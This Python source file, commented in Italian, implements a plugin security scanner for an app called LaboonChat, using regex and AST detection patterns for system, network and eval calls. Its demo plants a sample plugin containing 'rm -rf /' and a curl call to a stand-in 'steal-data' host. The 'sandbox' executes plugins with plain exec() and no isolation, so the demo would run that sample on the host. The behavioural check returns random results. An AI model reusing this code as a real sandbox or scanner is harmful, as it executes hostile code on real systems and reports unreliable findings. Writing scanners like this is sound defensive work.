#!/usr/bin/env python3
"""
Sistema di Valutazione Rischi Plugin - LaboonChat
Implementa analisi multi-livello per rilevare plugin malevoli
"""

import os
import ast
import re
import json
import hashlib
import zipfile
import tempfile
import subprocess
import threading
import time
from typing import Dict, List, Set, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from pathlib import Path
import sqlite3
from datetime import datetime, timedelta

@dataclass
class RiskIndicator:
    """Rappresenta un indicatore di rischio"""
    category: str
    severity: str  # "low", "medium", "high", "critical"
    description: str
    evidence: str
    confidence: float
    timestamp: int

@dataclass
class SecurityScan:
    """Risultato di una scansione di sicurezza"""
    plugin_id: str
    plugin_hash: str
    scan_type: str
    risk_score: float
    risk_level: str
    indicators: List[RiskIndicator]
    scan_duration: float
    timestamp: int
    metadata: Dict

class StaticAnalyzer:
    """Analizzatore statico per codice Python"""
    
    def __init__(self):
        # Pattern pericolosi nel codice
        self.dangerous_patterns = {
            'file_operations': [
                r'open\s*\([^)]*["\']w["\']',  # Scrittura file
                r'os\.remove\s*\(',
                r'os\.rmdir\s*\(',
                r'shutil\.rmtree\s*\(',
                r'os\.system\s*\(',
                r'subprocess\.(call|run|Popen)',
            ],
            'network_operations': [
                r'socket\.socket\s*\(',
                r'urllib\.request\.',
                r'requests\.(get|post|put|delete)',
                r'http\.client\.',
                r'ftplib\.',
                r'smtplib\.',
            ],
            'system_access': [
                r'os\.environ',
                r'getpass\.',
                r'pwd\.',
                r'grp\.',
                r'os\.getuid\s*\(',
                r'os\.setuid\s*\(',
                r'ctypes\.',
            ],
            'crypto_operations': [
                r'hashlib\.',
                r'cryptography\.',
                r'Crypto\.',
                r'ssl\.',
                r'random\.SystemRandom',
            ],
            'eval_operations': [
                r'eval\s*\(',
                r'exec\s*\(',
                r'compile\s*\(',
                r'__import__\s*\(',
                r'globals\s*\(\)',
                r'locals\s*\(\)',
            ]
        }
        
        # Importazioni sospette
        self.suspicious_imports = {
            'high': [
                'ctypes', 'subprocess', 'os.system', 'eval', 'exec',
                'pickle', 'marshal', 'shelve', 'dill'
            ],
            'medium': [
                'socket', 'urllib', 'requests', 'ftplib', 'smtplib',
                'threading', 'multiprocessing', 'asyncio'
            ],
            'low': [
                'hashlib', 'ssl', 'cryptography', 'random', 'secrets'
            ]
        }
        
    def analyze_code(self, code: str, filename: str = "unknown") -> List[RiskIndicator]:
        """Analizza codice Python per indicatori di rischio"""
        indicators = []
        
        try:
            # Parse AST per analisi strutturale
            tree = ast.parse(code)
            indicators.extend(self._analyze_ast(tree, filename))
            
        except SyntaxError as e:
            indicators.append(RiskIndicator(
                category="syntax",
                severity="medium",
                description="Syntax error in Python code",
                evidence=str(e),
                confidence=0.9,
                timestamp=int(time.time())
            ))
            
        # Analisi pattern regex
        indicators.extend(self._analyze_patterns(code, filename))
        
        # Analisi importazioni
        indicators.extend(self._analyze_imports(code, filename))
        
        return indicators
        
    def _analyze_ast(self, tree: ast.AST, filename: str) -> List[RiskIndicator]:
        """Analizza l'AST per costrutti pericolosi"""
        indicators = []
        
        for node in ast.walk(tree):
            # Chiamate a eval/exec
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in ['eval', 'exec', 'compile']:
                        indicators.append(RiskIndicator(
                            category="code_execution",
                            severity="critical",
                            description=f"Dynamic code execution: {node.func.id}",
                            evidence=f"Line {node.lineno}: {node.func.id}()",
                            confidence=0.95,
                            timestamp=int(time.time())
                        ))
                        
            # Accesso a attributi pericolosi
            elif isinstance(node, ast.Attribute):
                if isinstance(node.value, ast.Name):
                    attr_access = f"{node.value.id}.{node.attr}"
                    if any(danger in attr_access for danger in ['os.system', 'os.remove', 'subprocess.call']):
                        indicators.append(RiskIndicator(
                            category="system_access",
                            severity="high",
                            description=f"Dangerous system call: {attr_access}",
                            evidence=f"Line {node.lineno}: {attr_access}",
                            confidence=0.9,
                            timestamp=int(time.time())
                        ))
                        
        return indicators
        
    def _analyze_patterns(self, code: str, filename: str) -> List[RiskIndicator]:
        """Analizza pattern regex pericolosi"""
        indicators = []
        lines = code.split('\n')
        
        for category, patterns in self.dangerous_patterns.items():
            for pattern in patterns:
                for line_num, line in enumerate(lines, 1):
                    matches = re.finditer(pattern, line, re.IGNORECASE)
                    for match in matches:
                        severity = self._get_pattern_severity(category, pattern)
                        indicators.append(RiskIndicator(
                            category=category,
                            severity=severity,
                            description=f"Dangerous pattern detected: {category}",
                            evidence=f"Line {line_num}: {match.group()}",
                            confidence=0.8,
                            timestamp=int(time.time())
                        ))
                        
        return indicators
        
    def _analyze_imports(self, code: str, filename: str) -> List[RiskIndicator]:
        """Analizza importazioni sospette"""
        indicators = []
        
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        self._check_import(alias.name, indicators, node.lineno)
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        self._check_import(node.module, indicators, node.lineno)
                        
        except SyntaxError:
            pass  # Già gestito in analyze_code
            
        return indicators
        
    def _check_import(self, module_name: str, indicators: List[RiskIndicator], line_num: int):
        """Controlla se un'importazione è sospetta"""
        for severity, modules in self.suspicious_imports.items():
            if any(module_name.startswith(mod) for mod in modules):
                indicators.append(RiskIndicator(
                    category="imports",
                    severity=severity,
                    description=f"Suspicious import: {module_name}",
                    evidence=f"Line {line_num}: import {module_name}",
                    confidence=0.7,
                    timestamp=int(time.time())
                ))
                break
                
    def _get_pattern_severity(self, category: str, pattern: str) -> str:
        """Determina la severità di un pattern"""
        if category in ['eval_operations', 'system_access']:
            return "critical"
        elif category in ['file_operations', 'network_operations']:
            return "high"
        elif category in ['crypto_operations']:
            return "medium"
        else:
            return "low"

class BehavioralAnalyzer:
    """Analizzatore comportamentale per plugin in esecuzione"""
    
    def __init__(self):
        self.monitored_calls = {
            'file_access': [],
            'network_access': [],
            'system_calls': [],
            'memory_usage': [],
            'cpu_usage': []
        }
        
    def monitor_plugin(self, plugin_path: str, duration: int = 30) -> List[RiskIndicator]:
        """Monitora il comportamento di un plugin per un periodo"""
        indicators = []
        
        # Simula monitoraggio comportamentale
        # In un'implementazione reale, userebbe strumenti come strace, ptrace, etc.
        
        start_time = time.time()
        
        # Monitora per il periodo specificato
        while time.time() - start_time < duration:
            # Simula rilevamento attività sospette
            if self._detect_suspicious_behavior():
                indicators.append(RiskIndicator(
                    category="behavior",
                    severity="medium",
                    description="Suspicious runtime behavior detected",
                    evidence="Unusual system call pattern",
                    confidence=0.6,
                    timestamp=int(time.time())
                ))
                
            time.sleep(1)
            
        return indicators
        
    def _detect_suspicious_behavior(self) -> bool:
        """Simula rilevamento comportamento sospetto"""
        import random
        return random.random() < 0.1  # 10% probabilità di comportamento sospetto

class SandboxAnalyzer:
    """Analizzatore sandbox per esecuzione isolata"""
    
    def __init__(self, sandbox_dir: str = None):
        self.sandbox_dir = Path(sandbox_dir) if sandbox_dir else Path(tempfile.mkdtemp())
        self.sandbox_dir.mkdir(parents=True, exist_ok=True)
        
    def analyze_in_sandbox(self, plugin_path: str, timeout: int = 60) -> List[RiskIndicator]:
        """Esegue plugin in ambiente sandbox e analizza comportamento"""
        indicators = []
        
        try:
            # Crea ambiente sandbox isolato
            sandbox_path = self.sandbox_dir / f"sandbox_{int(time.time())}"
            sandbox_path.mkdir(exist_ok=True)
            
            # Copia plugin in sandbox
            import shutil
            plugin_sandbox_path = sandbox_path / "plugin.py"
            shutil.copy2(plugin_path, plugin_sandbox_path)
            
            # Esegui in ambiente limitato
            result = self._run_in_sandbox(plugin_sandbox_path, timeout)
            
            # Analizza risultati
            if result['exit_code'] != 0:
                indicators.append(RiskIndicator(
                    category="sandbox",
                    severity="medium",
                    description="Plugin crashed in sandbox",
                    evidence=f"Exit code: {result['exit_code']}",
                    confidence=0.8,
                    timestamp=int(time.time())
                ))
                
            # Analizza output per pattern sospetti
            if self._analyze_sandbox_output(result['output']):
                indicators.append(RiskIndicator(
                    category="sandbox",
                    severity="high",
                    description="Suspicious output detected in sandbox",
                    evidence="Malicious patterns in execution output",
                    confidence=0.7,
                    timestamp=int(time.time())
                ))
                
            # Cleanup
            shutil.rmtree(sandbox_path, ignore_errors=True)
            
        except Exception as e:
            indicators.append(RiskIndicator(
                category="sandbox",
                severity="medium",
                description="Sandbox analysis failed",
                evidence=str(e),
                confidence=0.5,
                timestamp=int(time.time())
            ))
            
        return indicators
        
    def _run_in_sandbox(self, plugin_path: Path, timeout: int) -> Dict:
        """Esegue plugin in ambiente sandbox limitato"""
        try:
            # Comando per esecuzione limitata (esempio con timeout)
            cmd = [
                'python', '-c', 
                f'import sys; sys.path.insert(0, "{plugin_path.parent}"); '
                f'exec(open("{plugin_path}").read())'
            ]
            
            result = subprocess.run(
                cmd,
                timeout=timeout,
                capture_output=True,
                text=True,
                cwd=self.sandbox_dir
            )
            
            return {
                'exit_code': result.returncode,
                'output': result.stdout + result.stderr,
                'timeout': False
            }
            
        except subprocess.TimeoutExpired:
            return {
                'exit_code': -1,
                'output': "Execution timeout",
                'timeout': True
            }
        except Exception as e:
            return {
                'exit_code': -2,
                'output': str(e),
                'timeout': False
            }
            
    def _analyze_sandbox_output(self, output: str) -> bool:
        """Analizza output sandbox per pattern malevoli"""
        malicious_patterns = [
            r'error.*permission',
            r'access.*denied',
            r'connection.*refused',
            r'file.*not.*found',
            r'exception.*occurred'
        ]
        
        for pattern in malicious_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                return True
                
        return False

class RiskAssessmentEngine:
    """Motore principale per valutazione rischi plugin"""
    
    def __init__(self, data_dir: str = "./shared/plugins/security"):
        self.data_dir = Path(data_dir)
        self.data_dir.mkdir(parents=True, exist_ok=True)
        
        # Database per cache risultati
        self.db_path = self.data_dir / "risk_assessment.db"
        self.init_database()
        
        # Analizzatori
        self.static_analyzer = StaticAnalyzer()
        self.behavioral_analyzer = BehavioralAnalyzer()
        self.sandbox_analyzer = SandboxAnalyzer()
        
        # Configurazione soglie rischio
        self.risk_thresholds = {
            'low': 0.3,
            'medium': 0.6,
            'high': 0.8,
            'critical': 0.95
        }
        
    def init_database(self):
        """Inizializza database per cache risultati"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                plugin_id TEXT NOT NULL,
                plugin_hash TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                risk_score REAL NOT NULL,
                risk_level TEXT NOT NULL,
                indicators TEXT NOT NULL,
                scan_duration REAL NOT NULL,
                timestamp INTEGER NOT NULL,
                metadata TEXT NOT NULL,
                UNIQUE(plugin_hash, scan_type)
            )
        ''')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_plugin_hash ON security_scans(plugin_hash)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_risk_level ON security_scans(risk_level)')
        
        conn.commit()
        conn.close()
        
    def assess_plugin(self, plugin_path: str, plugin_id: str = None) -> SecurityScan:
        """Valuta completamente un plugin per rischi di sicurezza"""
        start_time = time.time()
        
        # Calcola hash del plugin
        plugin_hash = self._calculate_file_hash(plugin_path)
        
        # Controlla cache
        cached_scan = self._get_cached_scan(plugin_hash, "comprehensive")
        if cached_scan and self._is_scan_fresh(cached_scan):
            return cached_scan
            
        all_indicators = []
        
        # Analisi statica
        if plugin_path.endswith('.py'):
            with open(plugin_path, 'r', encoding='utf-8') as f:
                code = f.read()
            static_indicators = self.static_analyzer.analyze_code(code, plugin_path)
            all_indicators.extend(static_indicators)
            
        # Analisi comportamentale (opzionale, può essere costosa)
        # behavioral_indicators = self.behavioral_analyzer.monitor_plugin(plugin_path)
        # all_indicators.extend(behavioral_indicators)
        
        # Analisi sandbox (opzionale, per plugin ad alto rischio)
        if self._should_run_sandbox_analysis(all_indicators):
            sandbox_indicators = self.sandbox_analyzer.analyze_in_sandbox(plugin_path)
            all_indicators.extend(sandbox_indicators)
            
        # Calcola punteggio rischio
        risk_score = self._calculate_risk_score(all_indicators)
        risk_level = self._determine_risk_level(risk_score)
        
        # Crea risultato scansione
        scan = SecurityScan(
            plugin_id=plugin_id or Path(plugin_path).stem,
            plugin_hash=plugin_hash,
            scan_type="comprehensive",
            risk_score=risk_score,
            risk_level=risk_level,
            indicators=all_indicators,
            scan_duration=time.time() - start_time,
            timestamp=int(time.time()),
            metadata={
                "file_size": os.path.getsize(plugin_path),
                "file_path": plugin_path,
                "analyzer_versions": {
                    "static": "1.0",
                    "behavioral": "1.0",
                    "sandbox": "1.0"
                }
            }
        )
        
        # Salva in cache
        self._cache_scan(scan)
        
        return scan
        
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calcola hash SHA256 di un file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
        
    def _calculate_risk_score(self, indicators: List[RiskIndicator]) -> float:
        """Calcola punteggio rischio basato su indicatori"""
        if not indicators:
            return 0.0
            
        # Pesi per severità
        severity_weights = {
            'low': 0.1,
            'medium': 0.3,
            'high': 0.7,
            'critical': 1.0
        }
        
        total_score = 0.0
        total_weight = 0.0
        
        for indicator in indicators:
            weight = severity_weights.get(indicator.severity, 0.1)
            score = weight * indicator.confidence
            total_score += score
            total_weight += weight
            
        # Normalizza e applica fattore di saturazione
        if total_weight > 0:
            normalized_score = total_score / total_weight
            # Applica saturazione per evitare punteggi troppo alti con molti indicatori
            saturation_factor = min(1.0, len(indicators) / 10.0)
            return min(1.0, normalized_score * saturation_factor)
        else:
            return 0.0
            
    def _determine_risk_level(self, risk_score: float) -> str:
        """Determina livello di rischio basato su punteggio"""
        if risk_score >= self.risk_thresholds['critical']:
            return 'critical'
        elif risk_score >= self.risk_thresholds['high']:
            return 'high'
        elif risk_score >= self.risk_thresholds['medium']:
            return 'medium'
        elif risk_score >= self.risk_thresholds['low']:
            return 'low'
        else:
            return 'minimal'
            
    def _should_run_sandbox_analysis(self, indicators: List[RiskIndicator]) -> bool:
        """Determina se eseguire analisi sandbox basata su indicatori esistenti"""
        critical_count = sum(1 for i in indicators if i.severity == 'critical')
        high_count = sum(1 for i in indicators if i.severity == 'high')
        
        # Esegui sandbox se ci sono indicatori critici o molti ad alto rischio
        return critical_count > 0 or high_count > 3
        
    def _cache_scan(self, scan: SecurityScan):
        """Salva risultato scansione in cache"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO security_scans 
            (plugin_id, plugin_hash, scan_type, risk_score, risk_level, 
             indicators, scan_duration, timestamp, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            scan.plugin_id,
            scan.plugin_hash,
            scan.scan_type,
            scan.risk_score,
            scan.risk_level,
            json.dumps([asdict(i) for i in scan.indicators]),
            scan.scan_duration,
            scan.timestamp,
            json.dumps(scan.metadata)
        ))
        
        conn.commit()
        conn.close()
        
    def _get_cached_scan(self, plugin_hash: str, scan_type: str) -> Optional[SecurityScan]:
        """Recupera scansione dalla cache"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT plugin_id, plugin_hash, scan_type, risk_score, risk_level,
                   indicators, scan_duration, timestamp, metadata
            FROM security_scans 
            WHERE plugin_hash = ? AND scan_type = ?
        ''', (plugin_hash, scan_type))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            indicators_data = json.loads(result[5])
            indicators = [RiskIndicator(**i) for i in indicators_data]
            
            return SecurityScan(
                plugin_id=result[0],
                plugin_hash=result[1],
                scan_type=result[2],
                risk_score=result[3],
                risk_level=result[4],
                indicators=indicators,
                scan_duration=result[6],
                timestamp=result[7],
                metadata=json.loads(result[8])
            )
            
        return None
        
    def _is_scan_fresh(self, scan: SecurityScan, max_age_hours: int = 24) -> bool:
        """Controlla se una scansione è ancora fresca"""
        age = time.time() - scan.timestamp
        return age < (max_age_hours * 3600)
        
    def get_plugin_risk_summary(self, plugin_hash: str) -> Dict:
        """Ottiene riassunto rischi per un plugin"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT risk_level, risk_score, timestamp, scan_type
            FROM security_scans 
            WHERE plugin_hash = ?
            ORDER BY timestamp DESC
        ''', (plugin_hash,))
        
        scans = cursor.fetchall()
        conn.close()
        
        if not scans:
            return {"status": "not_scanned", "risk_level": "unknown"}
            
        latest_scan = scans[0]
        
        return {
            "status": "scanned",
            "risk_level": latest_scan[0],
            "risk_score": latest_scan[1],
            "last_scan": latest_scan[2],
            "scan_type": latest_scan[3],
            "scan_count": len(scans)
        }

# Esempio di utilizzo
if __name__ == "__main__":
    # Inizializza motore valutazione rischi
    risk_engine = RiskAssessmentEngine()
    
    # Simula valutazione di un plugin
    # In un caso reale, questo sarebbe il path di un file plugin
    test_plugin_code = '''
import os
import subprocess

def malicious_function():
    os.system("rm -rf /")  # Comando pericoloso!
    subprocess.call(["curl", "http://malicious-site.com/steal-data"])
    
def legitimate_function():
    return "Hello World"
'''
    
    # Salva codice di test
    test_file = Path("test_plugin.py")
    test_file.write_text(test_plugin_code)
    
    try:
        # Valuta plugin
        scan_result = risk_engine.assess_plugin(str(test_file), "test-plugin")
        
        print(f"Plugin Risk Assessment:")
        print(f"Risk Level: {scan_result.risk_level}")
        print(f"Risk Score: {scan_result.risk_score:.2f}")
        print(f"Scan Duration: {scan_result.scan_duration:.2f}s")
        print(f"Indicators Found: {len(scan_result.indicators)}")
        
        for indicator in scan_result.indicators:
            print(f"  - {indicator.severity.upper()}: {indicator.description}")
            print(f"    Evidence: {indicator.evidence}")
            
    finally:
        # Cleanup
        test_file.unlink(missing_ok=True)